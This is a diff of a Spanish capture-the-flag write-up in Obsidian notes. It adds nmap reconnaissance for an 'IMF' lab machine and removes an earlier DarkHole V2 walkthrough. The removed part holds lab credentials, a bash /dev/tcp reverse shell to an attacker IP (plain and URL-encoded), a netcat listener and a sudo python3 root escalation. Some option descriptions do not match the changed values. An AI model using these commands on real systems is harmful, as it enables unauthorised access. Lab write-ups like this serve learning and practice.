@@ -92,23 +92,24 @@ Una vez copilada ejecutamos:
 ### 1.1 Reconocimiento: Escaneo de puerto | nMap
 
 ```
-nmap -p- --open -sS 172.16.23.129 -T4 -n -vvv -Pn -oA nmap 
+nmap -p- --open -sS 172.16.23.129 -T4 -n -vvv -Pn -oA SYNscan 
 ```
 
 Parámetros:
 - `-p-`: Escanea todos los puertos TCP del host, del puerto 1 al 65535.
 - `--open`: Solo muestra los puertos que están abiertos, ignorando los cerrados o filtrados.
 - `-sS`: Realiza un escaneo SYN stealth (Half-open scan), que envía paquetes SYN para detectar puertos abiertos sin completar la conexión TCP (menos detectable).
-- `172.16.23.129`: Es la dirección IP del objetivo o máquina a escanear.
 - `-T4`: Ajusta la velocidad del escaneo a un nivel agresivo (más rápido, menos sigiloso).
 - `-n`: No resuelve nombres DNS para las IPs, acelera el escaneo al evitar consultas DNS.
 - `-vvv`: Muestra salida muy detallada (nivel de verbosidad triple).
 - `-Pn`: No realiza ping previo para detectar si el host está activo; asume que está activo y escanea directamente.
-- `-oA nmap`: Exporta la salida en tres formatos simultáneamente (normal, XML y grepable) usando el prefijo de archivo "nmap".
+- `-oA SYNscan`: Exporta la salida en tres formatos simultáneamente (normal, XML y grepable) usando el prefijo de archivo "nmap".
 
 ![[Pasted image 20251031182855.png]]
 
 ### Reconocimiento: Scripts de Reconocimiento | nmap
+
+Ya que sabemos que tenemos el puerto 80 libre es nuestro momento de utilizar un conjunto de scripts de reconocimiento que  tiene nmap que nos permitirá identificar exactamente a que nos estamos enfrentando con información más a detalle
 
 Comando utilizado:
 ```
@@ -123,214 +124,13 @@ Parámetros:
 - `-vvv`: Salida verbose en tiempo real, útil para ver información en tiempo real.
 - `-n`: Deshabilita resolución DNS para acelerar el escaneo
 - `-Pn`: Omite host discovery y fuerza el reconocimiento de puertos
-- `-oA SYNscan`: Exporta la salida en tres formatos simultáneamente (normal, XML y grepable) usando el prefijo de archivo "nmap".
+- `-oA PORTscan`: Exporta la salida en tres formatos simultáneamente (normal, XML y grepable) usando el prefijo de archivo "nmap".
 
+![[Pasted image 20251031194320.png]]
 
-| Puerto | Protocolo | Servicio     | Versión                 | Observaciones               |
-| :----: | :-------: | :----------- | :---------------------- | :-------------------------- |
-| 22/tcp |    SSH    | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.3 | Potencial acceso remoto     |
-| 80/tcp |   HTTP    | Apache httpd | 2.4.41 (Ubuntu)         | Aplicación web: DarkHole V2 |
-En la tabla se puede ve que tal
-
-#### Puerto
-
-#### Puerto 2
+> [!INFO] Información  
+>  Equipo con puerto 80/tcp abierto, serivicio Apache httpd  2.4.18 corriendo en maquina  Ubuntu | Aplicación web: IMF 
 
 
 ---
-## II. Explotación
 
-### Vulnerabilidad: 
-
-#### Explotación con
-
-#### Proceso de explotación: SQL
-
-
-> [!success] Credenciales SSH Obtenidas
-> Usuario: jehad  
-> Contraseña: fool
-
-### Obtención de Shell SSH
-
-Comando:
-```
-ssh jehad@172.16.23.128
-```
-![[darkhole_2.18.png]]
-	Acceso exitoso a la máquina como usuario jehad.
-
----
-## III. Post-Explotación y Privesc
-
-### Enumeración Interna
-
-**Inventario del sistema:**
-
-Comando para ver kernel:
-```
-uname -a
-```
-![[darkhole_2.34.png]]
-	Resultado: Linux darkhole 5.4.0-81-generic 91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
-
-Comando para ver versión del SO:
-```
-cat /etc/os-release
-```
-![[darkhole_2.33.png]]
-	Resultado: Ubuntu 20.04.3 LTS (Focal Fossa)
-
-Comando para verificar privilegios sudo:
-```
-sudo -l
-```
-![[darkhole_2.32.png]]
-	Resultado: El usuario jehad no tiene permisos sudo.
-
-Comando para ver grupos:
-```
-id
-```
-![[darkhole_2.31.png]]
-	Resultado: jehad no pertenece a grupos privilegiados.
-
-Comando para listar usuarios:
-```
-cat /etc/passwd
-```
-![[darkhole_2.30.png]]
-	Usuarios con bash: root (UID 0), lama (UID 1000), jehad (UID 1001), losy (UID 1002).
-
-Comando para ver historial:
-```
-history
-```
-![[darkhole_2.19.png]]
-	Comandos críticos del historial:
-	1. cd /home/losy
-	2. cd /opt/web
-	3. curl "http://localhost:9999/?cmd=id"
-	4. ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129
-
-> [!tip] ¡Servicio Interno Detectado!
-> Gracias a los comandos ejecutados por el usuarios podemos entender que existe un servicio web interno en puerto 9999 con capacidad de ejecución remota de comandos.
-
-Comando para listar puertos en escucha:
-```
-netstat -tulpn
-```
-![[darkhole_2.20.png]]
-	Confirmación: servicio en **LISTEN** bajo puerto 9999.
-
-Comando para ver procesos:
-```
-htop
-```
-![[darkhole_2.21.png]]
-	El servicio corre como usuario losy, servidor PHP ubicado en /opt/web.
-
-Comandos para revisar el script PHP:
-```
-cd /opt/web
-cat index.php
-```
-![[darkhole_2.22.png]]
-	Script PHP simple para ejecución remota de comandos vía parámetro cmd.
-
-### Vector de Escalada
-
-Exploración del directorio home:
-![[darkhole_2.23.png]]
-	Se encontró la flag user.txt en /home/.
-
-#### Explotación del Servicio Interno
-
-Prueba de concepto con curl:
-```
-curl "http://localhost:9999/?cmd=id"
-```
-![[darkhole_2.24.png]]
-	El comando se ejecuta como usuario losy, confirmando RCE.
-
-#### Reverse Shell como losy
-
-Listener en máquina atacante:
-```
-nc -lvnp 443
-```
-![[darkhole_2.25.png]]
-	Nos podemos en escucha para recibir la señal que vamos a enviar desde el servicio PHP.
-
-Para mandar el payload lo debemos hacer en formato "URL Encode". Les dejo un ejemplo de como se vería el comando de forma "normal" y "URL Encoded".
-
-Comando original:
-```
-curl "http://localhost:9999/?cmd=bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'
-```
-
-URL Encoded:
-```
-curl "http://localhost:9999/?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261'"
-```
-![[darkhole_2.26.png]]
-	Shell inversa obtenida como losy.
-
-> [!WARNING] Advertencia  
-> Una vez establecida la conexión remota mediante netcat, la terminal puede no estar completamente operativa para la interacción directa. Por ello, es recomendable ejecutar un proceso de estabilización antes de continuar con la auditoría, asegurando así un entorno de trabajo más estable y funcional.
-#### Estabilización de TTY
-
-Comandos para estabilizar la shell:
-```
-/usr/bin/script -qc /bin/bash /dev/null
-```
-Luego CTRL+Z y ejecutar:
-```
-stty raw -echo; fg
-```
-Finalmente:
-```
-export TERM=xterm
-```
-
-> [!danger] Información Crítica en Historial
-> Comandos encontrados:
-> 1. sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
-> 2. sudo python3 -c 'import os; os.system("/bin/sh")'
-> 3. P0assw0rd losy:gang (credenciales expuestas)
-> 
-> Esto nos confirma que el usuario losy tiene permisos sudo para ejecutar Python como root bajo la credencial "gang".
-
-### Escalada a Root
-Comando para obtener shell root:
-```
-sudo python3 -c 'import os; os.system("/bin/sh")'
-```
-![[darkhole_2.0.png]]
-	Shell de root obtenida. Flag root.txt capturada en directorio /root.
-
----
-## Evidencias
-1. Comando `whoami` y hostname ejecutado como root:
-	![[darkhole_2.35.png]]
-
-Flags capturadas:
-- user.txt: `capturada en /home/`.
-- root.txt: `capturada en /root/`.
-
-> [!tip] Buenas prácticas de evidencia
-> Todos los comandos, payloads y respuestas del servidor fueron documentados con capturas de pantalla para su reproducibilidad.
-
----
-## Mitigación y Recomendaciones
-
-
-
----
-## Conclusiones
-
-**Lecciones aprendidas:** La exposición de repositorios Git con historial completo es una vulnerabilidad crítica que puede llevar a la filtración de credenciales. La inyección SQL manual sigue siendo efectiva cuando la validación de entradas es nula. Los servicios internos mal configurados y el historial de bash sin limpiar son vectores de escalada comunes.
-
-### Comparación con entornos reales:
-
-La dificultad media es apropiada. Requiere conocimientos sólidos de enumeración web, SQLi manual y pensamiento lateral para identificar servicios locales.
